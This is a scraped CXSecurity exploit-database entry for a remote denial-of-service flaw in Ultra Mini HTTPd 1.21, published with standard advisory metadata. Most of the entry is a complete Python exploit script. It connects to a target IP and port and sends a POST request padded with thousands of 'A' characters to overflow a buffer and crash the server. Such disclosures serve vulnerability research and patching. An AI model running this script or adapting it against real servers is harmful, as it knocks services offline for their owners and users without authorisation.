---
title: Ultra Mini HTTPd 1.21 - POST - Denial of Service (DoS)
url: https://cxsecurity.com/issue/WLB-2024100026
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-10-17
fetch_date: 2025-10-06T18:48:24.573321
---

# Ultra Mini HTTPd 1.21 - POST - Denial of Service (DoS)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Ultra Mini HTTPd 1.21 - POST - Denial of Service (DoS)** **2024.10.16**  **![br](https://cert.cx/cxstatic/images/flags/br.png) [Fagner Lima - Aka r3ng4f](https://cxsecurity.com/author/Fagner%2BLima%2B-%2BAka%2Br3ng4f/1/) **(BR)** ![br](https://cert.cx/cxstatic/images/flags/br.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[119](https://cxsecurity.com/cwe/119 "Click to see 119")** | |

# Exploit Title: Ultra Mini HTTPd 1.21 - POST - Denial of Service (DoS)
# Discovery by: Fagner Lima - Aka r3ng4f
# Discovery Date: 2024-1016
# Vendor Homepage: https://acme.com/
# Software Link: https://acme.com/
# Notification vendor: Yes reported
# Tested Version: Ultra Mini HTTPd 1.21
# Tested on: Window XP Professional - Service Pack 2 and 3 - English
# Vulnerability Type: Denial of Service (DoS)
import socket
import sys
import os
# Clear the console depending on the system
def clear\_console():
if os.name == 'nt': # For Windows
os.system('cls')
else: # For Mac and Linux
os.system('clear')
# Intro text
def intro():
print("\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*")
print("\* Ultra Mini HTTPd 1.21 - Denial of Service \*")
print("\* \*")
print("\* Coded by Fagner Lima - Aka r3ng4f \*")
print("\* \*")
print("\* e-mail: fagner.alex@gmail.com \*")
print("\* \*")
print("\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*")
# Main function to handle IP and port arguments
def main():
if len(sys.argv) != 3:
print("\nUsage: {} <ip> <port>".format(sys.argv[0]))
sys.exit(-1)
ip = sys.argv[1]
port = int(sys.argv[2])
return ip, port
# Function to exploit the vulnerability
def exploit(ip, port):
print("[+] Exploiting...")
buffer = "\x41" \* 192
payload = 'A' \* 5438 + buffer
try:
# Connect to the server
with socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) as s:
s.connect((ip, port))
request = f"POST / {payload} HTTP/1.1\r\nHost:{ip}\r\n\r\n"
s.send(request.encode())
print("[+] Exploit sent successfully!")
except Exception as e:
print(f"[-] Failed to connect: {e}")
# Run the exploit
if \_\_name\_\_ == "\_\_main\_\_":
clear\_console()
intro()
ip, port = main()
exploit(ip, port)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024100026)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top